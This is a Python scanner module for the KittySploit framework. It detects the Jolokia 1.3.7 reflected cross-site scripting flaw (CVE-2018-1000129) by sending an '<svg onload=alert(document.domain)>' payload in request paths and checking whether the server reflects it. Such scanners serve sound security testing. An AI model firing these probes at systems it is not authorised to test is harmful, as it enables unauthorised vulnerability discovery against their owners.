#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Jolokia 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jolokia 1.3.7 - Cross-Site Scripting Detection',
        'description': "Jolokia 1.3.7 is vulnerable to cross-site scripting in the HTTP servlet and allows an attacker to execute malicious JavaScript in the victim's browser.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'jolokia', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://jolokia.org/#Security_fixes_with_1.5.0',
            'https://github.com/rhuss/jolokia/commit/5895d5c137c335e6b473e9dcb9baf748851bbc5f#diff-f19898247eddb55de6400489bff748ad',
            'https://blog.gdssecurity.com/labs/2018/4/18/jolokia-vulnerabilities-rce-xss.html',
            'https://blog.it-securityguard.com/how-i-made-more-than-30k-with-jolokia-cves/',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-1000129',
        ],
        'cve': 'CVE-2018-1000129',
    }

    def run(self):
        for path in ('/api/jolokia/read<svg%20onload=alert(document.domain)>?mimeType=text/html', '/jolokia/read<svg%20onload=alert(document.domain)>?mimeType=text/html'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('<svg onload=alert(document.domain)>', 'java.lang.IllegalArgumentException', 'No type with name',)
            header_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="Jolokia 1.3.7 - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

